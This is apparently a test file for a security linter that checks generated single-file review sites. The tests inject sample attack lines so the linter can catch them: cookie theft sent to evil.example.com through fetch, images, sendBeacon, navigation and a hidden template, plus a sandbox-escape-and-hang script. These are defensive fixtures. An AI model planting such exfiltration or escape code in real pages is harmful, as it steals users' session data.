import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { cp, mkdtemp, readFile, rm, writeFile, mkdir } from "node:fs/promises";
import { tmpdir } from "node:os";
import { fileURLToPath } from "node:url";
import { join } from "node:path";
import { describe, it } from "node:test";
import { checkReviewSite, type Finding, type GateId, type ReviewSiteReport } from "./check.js";
import { resolveArtifactRefs } from "../harness/provenance/index.js";

const FIXTURE = fileURLToPath(new URL("../../validation/fixtures/review-site", import.meta.url));

function gate(report: ReviewSiteReport, id: GateId): Finding {
  const f = report.findings.find((x) => x.gate === id);
  assert.ok(f, `report missing ${id}`);
  return f;
}

/** Copy the clean Lane 0 fixture into a scratch dir a test can mutate. */
async function scratchFixture(): Promise<{ dir: string; cleanup: () => Promise<void> }> {
  const root = await mkdtemp(join(tmpdir(), "review-site-check-"));
  const dir = join(root, "review-site");
  await cp(FIXTURE, dir, { recursive: true });
  return { dir, cleanup: () => rm(root, { recursive: true, force: true }) };
}

async function edit(dir: string, rel: string, fn: (s: string) => string): Promise<void> {
  const p = join(dir, rel);
  await writeFile(p, fn(await readFile(p, "utf8")));
}

describe("check_review_site — clean Lane 0 fixture passes G1-G8", () => {
  it("every gate is ok on the contract-clean fixture", async () => {
    const report = await checkReviewSite({ siteDir: FIXTURE, cdnAllowlist: [] });
    for (const f of report.findings) {
      assert.equal(f.ok, true, `${f.gate} should pass clean: ${f.detail}`);
    }
    assert.equal(report.ok, true);
    assert.deepEqual(
      report.findings.map((f) => f.gate),
      ["G1", "G2", "G3", "G4", "G5", "G6", "G7", "G8"],
    );
  });
});

describe("check_review_site — one mutation per gate fails exactly that gate", () => {
  it("G1: dropping index.html fails G1", async () => {
    const { dir, cleanup } = await scratchFixture();
    try {
      await rm(join(dir, "index.html"));
      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
      assert.equal(gate(report, "G1").ok, false);
      assert.equal(report.ok, false);
    } finally {
      await cleanup();
    }
  });

  it("G2: an absolute-path ref fails G2", async () => {
    const { dir, cleanup } = await scratchFixture();
    try {
      await edit(dir, "index.html", (s) =>
        s.replace('<div class="shell">', '<img src="/assets/x.png" />\n<div class="shell">'),
      );
      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
      assert.equal(gate(report, "G2").ok, false, gate(report, "G2").detail);
      assert.match(gate(report, "G2").detail, /absolute/);
    } finally {
      await cleanup();
    }
  });

  it("G2: a `..` traversal ref fails G2", async () => {
    const { dir, cleanup } = await scratchFixture();
    try {
      await edit(dir, "index.html", (s) =>
        s.replace('<div class="shell">', '<img src="../secret/x.png" />\n<div class="shell">'),
      );
      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
      assert.equal(gate(report, "G2").ok, false);
      assert.match(gate(report, "G2").detail, /\.\./);
    } finally {
      await cleanup();
    }
  });

  it("G2 single-document delta: a separate-file <script src> fails G2", async () => {
    const { dir, cleanup } = await scratchFixture();
    try {
      // A real sibling .js file (so the miss isn't a dangling-ref finding) that
      // the site loads via a separate <script src> — which blanks in the
      // opaque-origin sandbox; the whole site must be one inlined index.html.
      await writeFile(join(dir, "extra.js"), "window.EXTRA = 1;\n");
      await edit(dir, "index.html", (s) =>
        s.replace("</body>", '<script src="extra.js"></script>\n</body>'),
      );
      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
      assert.equal(gate(report, "G2").ok, false, gate(report, "G2").detail);
      assert.match(gate(report, "G2").detail, /separate file/);
    } finally {
      await cleanup();
    }
  });

  it("G3: removing a declared data global fails G3", async () => {
    const { dir, cleanup } = await scratchFixture();
    try {
      // Rename the window.REVIEW_DATA assignment while the manifest still
      // declares REVIEW_DATA in data_globals.
      await edit(dir, "index.html", (s) =>
        s.replace("window.REVIEW_DATA =", "window.REVIEW_DATA_RENAMED ="),
      );
      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
      assert.equal(gate(report, "G3").ok, false, gate(report, "G3").detail);
      assert.match(gate(report, "G3").detail, /REVIEW_DATA/);
    } finally {
      await cleanup();
    }
  });

  it("G4: a getElementById with no matching element fails G4", async () => {
    const { dir, cleanup } = await scratchFixture();
    try {
      await edit(dir, "index.html", (s) =>
        s.replace(
          'tbody: document.getElementById("rows-body"),',
          'tbody: document.getElementById("does-not-exist"),',
        ),
      );
      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
      assert.equal(gate(report, "G4").ok, false, gate(report, "G4").detail);
      assert.match(gate(report, "G4").detail, /does-not-exist/);
    } finally {
      await cleanup();
    }
  });

  it("G5: a local fetch of a .json path fails G5", async () => {
    const { dir, cleanup } = await scratchFixture();
    try {
      await edit(dir, "index.html", (s) =>
        s.replace('"use strict";', '"use strict";\n  fetch("data/values.json");'),
      );
      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
      assert.equal(gate(report, "G5").ok, false, gate(report, "G5").detail);
      assert.match(gate(report, "G5").detail, /fetch/);
    } finally {
      await cleanup();
    }
  });

  it("G5 (F1): a window.location navigation exfil fails G5", async () => {
    const { dir, cleanup } = await scratchFixture();
    try {
      await edit(dir, "index.html", (s) =>
        s.replace(
          '"use strict";',
          '"use strict";\n  window.location = "https://evil.example.com/?c=" + document.cookie;',
        ),
      );
      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
      assert.equal(gate(report, "G5").ok, false, gate(report, "G5").detail);
      assert.match(gate(report, "G5").detail, /navigation sink/);
      assert.match(gate(report, "G5").detail, /location/);
    } finally {
      await cleanup();
    }
  });

  it("G5 (F1): a navigation-exfil script hidden in a <template> fails G5", async () => {
    // parse5 stores <template> content in `.content` (a DocumentFragment), not
    // childNodes; the linter must walk it, else a script that is later
    // `tpl.content.cloneNode(true)`-ed into the DOM bypasses G5's sink scan.
    const { dir, cleanup } = await scratchFixture();
    try {
      await edit(dir, "index.html", (s) =>
        s.replace(
          '<h1 id="sample-title">Review</h1>',
          '<h1 id="sample-title">Review</h1>\n<template id="t"><script>window.location = "https://evil.example.com/?c=" + document.cookie;<\/script></template>',
        ),
      );
      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
      assert.equal(gate(report, "G5").ok, false, gate(report, "G5").detail);
      assert.match(gate(report, "G5").detail, /navigation sink/);
      assert.match(gate(report, "G5").detail, /location/);
    } finally {
      await cleanup();
    }
  });

  it("G5 (F5): an inline on* event handler fails G5", async () => {
    const { dir, cleanup } = await scratchFixture();
    try {
      await edit(dir, "index.html", (s) =>
        s.replace(
          '<h1 id="sample-title">Review</h1>',
          '<h1 id="sample-title" onclick="location=\'https://evil.example.com\'">Review</h1>',
        ),
      );
      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
      assert.equal(gate(report, "G5").ok, false, gate(report, "G5").detail);
      assert.match(gate(report, "G5").detail, /event handler/);
    } finally {
      await cleanup();
    }
  });

  it("G5 (F6): a <meta http-equiv=refresh> fails G5", async () => {
    const { dir, cleanup } = await scratchFixture();
    try {
      await edit(dir, "index.html", (s) =>
        s.replace(
          "</head>",
          '<meta http-equiv="refresh" content="0; url=https://evil.example.com/?c=x" />\n</head>',
        ),
      );
      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
      assert.equal(gate(report, "G5").ok, false, gate(report, "G5").detail);
      assert.match(gate(report, "G5").detail, /refresh/);
    } finally {
      await cleanup();
    }
  });

  it("G6: an external origin not in cdn_allowlist fails G6", async () => {
    const { dir, cleanup } = await scratchFixture();
    try {
      await edit(dir, "index.html", (s) =>
        s.replace(
          '<div class="shell">',
          '<img src="https://cdn.evil.example.com/x.png" />\n<div class="shell">',
        ),
      );
      const denied = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
      assert.equal(gate(denied, "G6").ok, false, gate(denied, "G6").detail);
      assert.match(gate(denied, "G6").detail, /cdn\.evil\.example\.com/);

      // Same site passes G6 once the origin is allowlisted (protocol policy).
      const allowed = await checkReviewSite({
        siteDir: dir,
        cdnAllowlist: ["https://cdn.evil.example.com"],
      });
      assert.equal(gate(allowed, "G6").ok, true, gate(allowed, "G6").detail);
    } finally {
      await cleanup();
    }
  });

  it("G6 (F6): an <object data=external> fails G6", async () => {
    const { dir, cleanup } = await scratchFixture();
    try {
      await edit(dir, "index.html", (s) =>
        s.replace(
          '<div class="shell">',
          '<object data="https://evil.example.com/x.swf"></object>\n<div class="shell">',
        ),
      );
      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
      assert.equal(report.ok, false);
      assert.equal(gate(report, "G6").ok, false, gate(report, "G6").detail);
      assert.match(gate(report, "G6").detail, /evil\.example\.com/);
    } finally {
      await cleanup();
    }
  });

  it("G7 (F2 redefined): a manifest with no verdict_schema fails G7", async () => {
    // G7 no longer requires an in-iframe export surface (that moved to the
    // trusted shell; a download sink is now a G5 hard-fail). What it requires is
    // the manifest naming the verdict_schema the shell will emit under.
    const { dir, cleanup } = await scratchFixture();
    try {
      await edit(dir, "index.html", (s) =>
        s.replace(/^\s*verdict_schema: "review-verdict\/1",\n/m, ""),
      );
      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
      assert.equal(gate(report, "G7").ok, false, gate(report, "G7").detail);
      assert.match(gate(report, "G7").detail, /verdict_schema/);
    } finally {
      await cleanup();
    }
  });

  it("G7 (F2): the clean fixture — which self-exports nothing — passes G7", async () => {
    const report = await checkReviewSite({ siteDir: FIXTURE, cdnAllowlist: [] });
    assert.equal(gate(report, "G7").ok, true, gate(report, "G7").detail);
  });

  it("G8: a produced_from hash / sample_id that does not match the run fails G8", async () => {
    const { dir, cleanup } = await scratchFixture();
    try {
      // Build a run measurements file and point the inline manifest at it
      // faithfully, then mutate the manifest to prove the fidelity check catches
      // drift.
      const resultsPath = join(dir, "results.json");
      const resultsBytes = JSON.stringify({ sample_id: "toy-run-1", slope: 0.12, n: 200 });
      await writeFile(resultsPath, resultsBytes);
      const hash = createHash("sha256").update(resultsBytes).digest("hex");

      await edit(dir, "index.html", (s) =>
        s
          .replace('sample_id: "oa-knee-0007"', 'sample_id: "toy-run-1"')
          .replace(/"measurements\/results\.json@[0-9a-f]{64}"/, `"results.json@${hash}"`),
      );
      const ok = await checkReviewSite({ siteDir: dir, cdnAllowlist: [], resultsPath });
      assert.equal(gate(ok, "G8").ok, true, gate(ok, "G8").detail);

      // Mismatched sample_id (caught against the measurement's own sample_id).
      await edit(dir, "index.html", (s) =>
        s.replace('sample_id: "toy-run-1"', 'sample_id: "wrong-sample"'),
      );
      const badId = await checkReviewSite({ siteDir: dir, cdnAllowlist: [], resultsPath });
      assert.equal(gate(badId, "G8").ok, false, gate(badId, "G8").detail);
      assert.match(gate(badId, "G8").detail, /sample_id/);

      // Mismatched produced_from hash (stale site).
      await edit(dir, "index.html", (s) =>
        s
          .replace('sample_id: "wrong-sample"', 'sample_id: "toy-run-1"')
          .replace(`@${hash}`, `@${"0".repeat(64)}`),
      );
      const badHash = await checkReviewSite({ siteDir: dir, cdnAllowlist: [], resultsPath });
      assert.equal(gate(badHash, "G8").ok, false, gate(badHash, "G8").detail);
      assert.match(gate(badHash, "G8").detail, /hash/);
    } finally {
      await cleanup();
    }
  });
});

const CONNECT_SRC_NONE_CSP =
  "default-src 'self'; script-src 'self' 'unsafe-inline'; connect-src 'none'; webrtc 'block'";

describe("check_review_site — F3 dynamic-sink hard-fails (anchor/image/WebRTC/navigation)", () => {
  // The exact classes CSP connect-src 'none' does NOT own. A malicious fixture
  // that dynamically builds them must FAIL the gate even under a confirmed
  // connect-src 'none' (which only downgrades the fetch/XHR class).
  const CASES: ReadonlyArray<{ name: string; js: string; match: RegExp }> = [
    {
      name: "dynamic anchor + download + programmatic click",
      js: 'var a = document.createElement("a"); a.href = "https://evil.example.com/?c=" + document.cookie; a.download = "x.json"; a.click();',
      match: /download\/self-export sink/,
    },
    {
      name: "new Image() exfil",
      js: 'var i = new Image(); i.src = "https://evil.example.com/p?c=" + document.cookie;',
      match: /dynamic image sink/,
    },
    {
      name: 'document.createElement("img") exfil',
      js: 'var i = document.createElement("img"); i.src = "https://evil.example.com/p";',
      match: /dynamic image sink/,
    },
    {
      name: "RTCPeerConnection data channel",
      js: 'var pc = new RTCPeerConnection({ iceServers: [] });',
      match: /WebRTC sink/,
    },
    {
      name: "window.open navigation",
      js: 'window.open("https://evil.example.com/?c=" + document.cookie);',
      match: /navigation sink/,
    },
    {
      name: "form.submit() navigation",
      js: 'document.forms[0].submit();',
      match: /navigation sink/,
    },
  ];

  for (const c of CASES) {
    it(`hard-fails G5 (even under connect-src 'none'): ${c.name}`, async () => {
      const { dir, cleanup } = await scratchFixture();
      try {
        await edit(dir, "index.html", (s) => s.replace('"use strict";', `"use strict";\n  ${c.js}`));
        const report = await checkReviewSite({
          siteDir: dir,
          cdnAllowlist: [],
          contentSecurityPolicy: CONNECT_SRC_NONE_CSP,
        });
        assert.equal(gate(report, "G5").ok, false, gate(report, "G5").detail);
        assert.match(gate(report, "G5").detail, c.match);
        assert.equal(report.ok, false);
      } finally {
        await cleanup();
      }
    });
  }
});

describe("check_review_site — F5 connect-src downgrade is narrow + fail-closed", () => {
  async function fetchFixture(): Promise<{ dir: string; cleanup: () => Promise<void> }> {
    const f = await scratchFixture();
    await edit(f.dir, "index.html", (s) =>
      s.replace('"use strict";', '"use strict";\n  fetch("https://evil.example.com/x?d=" + document.cookie);'),
    );
    return f;
  }

  it("a fetch is only a WARNING when the served CSP is exactly connect-src 'none'", async () => {
    const { dir, cleanup } = await fetchFixture();
    try {
      const report = await checkReviewSite({
        siteDir: dir,
        cdnAllowlist: [],
        contentSecurityPolicy: CONNECT_SRC_NONE_CSP,
      });
      assert.equal(gate(report, "G5").ok, true, gate(report, "G5").detail);
      assert.match(String(gate(report, "G5").warnings), /fetch/);
      assert.match(String(gate(report, "G5").warnings), /neutralized by served connect-src 'none'/);
    } finally {
      await cleanup();
    }
  });

  it("FAIL CLOSED: the same fetch hard-fails when NO policy is supplied", async () => {
    const { dir, cleanup } = await fetchFixture();
    try {
      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
      assert.equal(gate(report, "G5").ok, false, gate(report, "G5").detail);
      assert.match(gate(report, "G5").detail, /fail-closed/);
    } finally {
      await cleanup();
    }
  });

  it("FAIL CLOSED: the same fetch hard-fails under a WEAKER policy (connect-src 'self')", async () => {
    const { dir, cleanup } = await fetchFixture();
    try {
      const report = await checkReviewSite({
        siteDir: dir,
        cdnAllowlist: [],
        contentSecurityPolicy: "default-src 'self'; connect-src 'self'",
      });
      assert.equal(gate(report, "G5").ok, false, gate(report, "G5").detail);
    } finally {
      await cleanup();
    }
  });

  it("FAIL CLOSED: a MISSING connect-src directive (falls back to default-src) does not downgrade", async () => {
    const { dir, cleanup } = await fetchFixture();
    try {
      const report = await checkReviewSite({
        siteDir: dir,
        cdnAllowlist: [],
        contentSecurityPolicy: "default-src 'self'",
      });
      assert.equal(gate(report, "G5").ok, false, gate(report, "G5").detail);
    } finally {
      await cleanup();
    }
  });
});

describe("check_review_site — the real inlined-three.js task-008 template passes the floor", () => {
  const TASK_008 = fileURLToPath(
    new URL("../../tasks/task-2026-07-10-008", import.meta.url),
  );
  it("all G-checks pass; the vendored three.js fetch is a warning, no download/nav sink remains", async () => {
    const report = await checkReviewSite({
      siteDir: join(TASK_008, "artifacts", "review-site"),
      cdnAllowlist: [],
      measurementsRoot: join(TASK_008, "artifacts"),
      expectedSampleId: "task-2026-07-10-008",
      requireFidelity: true,
      contentSecurityPolicy: CONNECT_SRC_NONE_CSP,
    });
    for (const f of report.findings) {
      assert.equal(f.ok, true, `${f.gate} should pass: ${f.detail}`);
    }
    assert.equal(report.ok, true);
    assert.equal(report.fidelity, "verified");
    // The only G5 hit is the dead vendored three.js loader fetch, downgraded.
    assert.match(String(gate(report, "G5").warnings ?? ""), /fetch/);
  });
});

describe("review-artifact provenance node — resolveArtifactRefs yields a first-class chain node", () => {
  it("resolves the phase inputs/outputs to hashed provenance refs", async () => {
    const root = await mkdtemp(join(tmpdir(), "review-artifact-prov-"));
    const taskDir = join(root, "task");
    try {
      // Minimal task tree: upstream measurement + a produced (single-doc) site.
      await mkdir(join(taskDir, "artifacts", "regression"), { recursive: true });
      await cp(FIXTURE, join(taskDir, "artifacts", "review-site"), { recursive: true });
      await writeFile(
        join(taskDir, "artifacts", "regression", "regression.json"),
        JSON.stringify({ slope: 0.12, intercept: 0.4, r_squared: 0.55, n: 200 }),
      );

      // Same declared paths the review-artifact phase carries, resolved the way
      // runGate builds the provenance entry (via resolveArtifactRefs).
      const inputs = await resolveArtifactRefs(taskDir, ["regression/regression.json"]);
      const outputs = await resolveArtifactRefs(taskDir, ["review-site/index.html"]);

      assert.equal(inputs[0]?.path, "artifacts/regression/regression.json");
      assert.match(String(inputs[0]?.hash), /^[0-9a-f]{12,}$/);
      assert.deepEqual(
        outputs.map((o) => o.path),
        ["artifacts/review-site/index.html"],
      );
      for (const o of outputs) {
        assert.match(String(o.hash), /^[0-9a-f]{12,}$/, `${o.path} should be hashed`);
      }
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  });
});

describe("check_review_site — parse-don't-execute closes the bypass classes", () => {
  it("H2: a malicious inline <script> is NOT executed and the linter still terminates", async () => {
    const { dir, cleanup } = await scratchFixture();
    const sentinel = "__REVIEW_SITE_PWNED__";
    try {
      // The old linter ran this in node:vm — a constructor escape to the real
      // global + an infinite loop (RCE + DoS in the reviewer's process). Static
      // parsing must neither set the sentinel nor hang, even inlined.
      await edit(dir, "index.html", (s) =>
        s.replace(
          "</body>",
          `<script>this.constructor.constructor("globalThis.${sentinel} = true")();\nwhile (true) {}</script>\n</body>`,
        ),
      );
      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
      assert.equal(sentinel in globalThis, false, "producer code must not execute");
      assert.equal(typeof report.ok, "boolean", "the linter must terminate and return a report");
    } finally {
      delete (globalThis as Record<string, unknown>)[sentinel];
      await cleanup();
    }
  });

  it("bypass: an UNQUOTED external script src fails G6", async () => {
    const { dir, cleanup } = await scratchFixture();
    try {
      await edit(dir, "index.html", (s) =>
        s.replace("</body>", "<script src=https://cdn.evil.example.com/x.js></script>\n</body>"),
      );
      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
      assert.equal(gate(report, "G6").ok, false, gate(report, "G6").detail);
      assert.match(gate(report, "G6").detail, /cdn\.evil\.example\.com/);
    } finally {
      await cleanup();
    }
  });

  it("bypass: an HTML-entity-encoded external src is DECODED and fails G6", async () => {
    const { dir, cleanup } = await scratchFixture();
    try {
      // parse5 decodes the entity (&#x68;ttps → https) exactly as the browser
      // would — the hand-rolled tokenizer could be fooled by this (codex F8).
      await edit(dir, "index.html", (s) =>
        s.replace(
          '<div class="shell">',
          '<img src="&#x68;ttps://track.evil.example.com/p.png" />\n<div class="shell">',
        ),
      );
      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
      assert.equal(gate(report, "G6").ok, false, gate(report, "G6").detail);
      assert.match(gate(report, "G6").detail, /track\.evil\.example\.com/);
    } finally {
      await cleanup();
    }
  });

  it("bypass: a data: URL on a <script> fails G2", async () => {
    const { dir, cleanup } = await scratchFixture();
    try {
      await edit(dir, "index.html", (s) =>
        s.replace("</body>", '<script src="data:text/javascript,alert(1)"></script>\n</body>'),
      );
      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
      assert.equal(gate(report, "G2").ok, false, gate(report, "G2").detail);
      assert.match(gate(report, "G2").detail, /data:/);
    } finally {
      await cleanup();
    }
  });

  it("bypass: a javascript: href fails G2", async () => {
    const { dir, cleanup } = await scratchFixture();
    try {
      await edit(dir, "index.html", (s) =>
        s.replace('<div class="shell">', '<a href="javascript:alert(1)">x</a>\n<div class="shell">'),
      );
      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
      assert.equal(gate(report, "G2").ok, false, gate(report, "G2").detail);
      assert.match(gate(report, "G2").detail, /script-URL/);
    } finally {
      await cleanup();
    }
  });

  it("bypass: a CSS @import of an external origin fails G6", async () => {
    const { dir, cleanup } = await scratchFixture();
    try {
      await edit(dir, "index.html", (s) =>
        s.replace("</head>", '<style>@import "https://fonts.evil.example.com/x.css";</style>\n</head>'),
      );
      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
      assert.equal(gate(report, "G6").ok, false, gate(report, "G6").detail);
      assert.match(gate(report, "G6").detail, /fonts\.evil\.example\.com/);
    } finally {
      await cleanup();
    }
  });

  it("bypass: an inline style url() of an external origin fails G6", async () => {
    const { dir, cleanup } = await scratchFixture();
    try {
      await edit(dir, "index.html", (s) =>
        s.replace('<div class="shell">', '<div class="shell" style="background:url(https://track.evil.example.com/p.png)">'),
      );
      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
      assert.equal(gate(report, "G6").ok, false, gate(report, "G6").detail);
      assert.match(gate(report, "G6").detail, /track\.evil\.example\.com/);
    } finally {
      await cleanup();
    }
  });

  it("bypass: an external fetch (concatenated, non-literal) fails G5", async () => {
    const { dir, cleanup } = await scratchFixture();
    try {
      await edit(dir, "index.html", (s) =>
        s.replace('"use strict";', '"use strict";\n  fetch("https://evil.example.com/exfil?d=" + document.cookie);'),
      );
      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
      assert.equal(gate(report, "G5").ok, false, gate(report, "G5").detail);
      assert.match(gate(report, "G5").detail, /fetch/);
    } finally {
      await cleanup();
    }
  });

  it("bypass: a computed window['fetch'] alias fails G5", async () => {
    const { dir, cleanup } = await scratchFixture();
    try {
      await edit(dir, "index.html", (s) =>
        s.replace('"use strict";', '"use strict";\n  window["fetch"]("https://evil.example.com/x");'),
      );
      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
      assert.equal(gate(report, "G5").ok, false, gate(report, "G5").detail);
      assert.match(gate(report, "G5").detail, /fetch/);
    } finally {
      await cleanup();
    }
  });

  it("bypass: navigator.sendBeacon fails G5", async () => {
    const { dir, cleanup } = await scratchFixture();
    try {
      await edit(dir, "index.html", (s) =>
        s.replace('"use strict";', '"use strict";\n  navigator.sendBeacon("https://evil.example.com/b", document.cookie);'),
      );
      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
      assert.equal(gate(report, "G5").ok, false, gate(report, "G5").detail);
      assert.match(gate(report, "G5").detail, /sendBeacon/);
    } finally {
      await cleanup();
    }
  });

  it("bypass: a dynamic import() fails G5", async () => {
    const { dir, cleanup } = await scratchFixture();
    try {
      await edit(dir, "index.html", (s) =>
        s.replace('"use strict";', '"use strict";\n  import("https://evil.example.com/x.js");'),
      );
      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
      assert.equal(gate(report, "G5").ok, false, gate(report, "G5").detail);
      assert.match(gate(report, "G5").detail, /import/);
    } finally {
      await cleanup();
    }
  });

  it("bypass: a dangling relative ref (no file) fails G2", async () => {
    const { dir, cleanup } = await scratchFixture();
    try {
      await edit(dir, "index.html", (s) =>
        s.replace('<div class="shell">', '<img src="assets/missing.png" />\n<div class="shell">'),
      );
      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
      assert.equal(gate(report, "G2").ok, false, gate(report, "G2").detail);
      assert.match(gate(report, "G2").detail, /missing file/);
    } finally {
      await cleanup();
    }
  });

  it("bypass: an inline <script> with a bad getElementById fails G4", async () => {
    const { dir, cleanup } = await scratchFixture();
    try {
      await edit(dir, "index.html", (s) =>
        s.replace("</body>", '<script>document.getElementById("ghost-node");</script>\n</body>'),
      );
      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
      assert.equal(gate(report, "G4").ok, false, gate(report, "G4").detail);
      assert.match(gate(report, "G4").detail, /ghost-node/);
    } finally {
      await cleanup();
    }
  });
});

describe("check_review_site — G8 fidelity fails when required-but-unverifiable (H1/H1b)", () => {
  it("H1: requireFidelity with no measurement on disk fails G8", async () => {
    const { dir, cleanup } = await scratchFixture();
    try {
      // Point the inline manifest at a measurement that isn't present under
      // measurementsRoot.
      await edit(dir, "index.html", (s) =>
        s
          .replace('sample_id: "oa-knee-0007"', 'sample_id: "task-x"')
          .replace(/"measurements\/results\.json@[0-9a-f]{64}"/, `"measurements/results.json@${"a".repeat(64)}"`),
      );
      const report = await checkReviewSite({
        siteDir: dir,
        cdnAllowlist: [],
        measurementsRoot: dir,
        expectedSampleId: "task-x",
        requireFidelity: true,
      });
      assert.equal(report.fidelity, "unverified");
      assert.equal(gate(report, "G8").ok, false, gate(report, "G8").detail);
      assert.match(gate(report, "G8").detail, /fidelity required/);
    } finally {
      await cleanup();
    }
  });

  it("H1b: a manifest sample_id that isn't the harness run id fails G8", async () => {
    const { dir, cleanup } = await scratchFixture();
    try {
      const resultsRel = join("measurements", "results.json");
      await mkdir(join(dir, "measurements"), { recursive: true });
      const bytes = JSON.stringify({ slope: 0.12, n: 200 }); // toy stats: no sample_id
      await writeFile(join(dir, resultsRel), bytes);
      const hash = createHash("sha256").update(bytes).digest("hex");
      await edit(dir, "index.html", (s) =>
        s
          .replace('sample_id: "oa-knee-0007"', 'sample_id: "attacker-picked"')
          .replace(/"measurements\/results\.json@[0-9a-f]{64}"/, `"measurements/results.json@${hash}"`),
      );
      const report = await checkReviewSite({
        siteDir: dir,
        cdnAllowlist: [],
        measurementsRoot: dir,
        expectedSampleId: "task-2026-07-09-001",
        requireFidelity: true,
      });
      assert.equal(report.fidelity, "verified", "hash matched, so fidelity is verified");
      assert.equal(gate(report, "G8").ok, false, gate(report, "G8").detail);
      assert.match(gate(report, "G8").detail, /run id/);
    } finally {
      await cleanup();
    }
  });
});
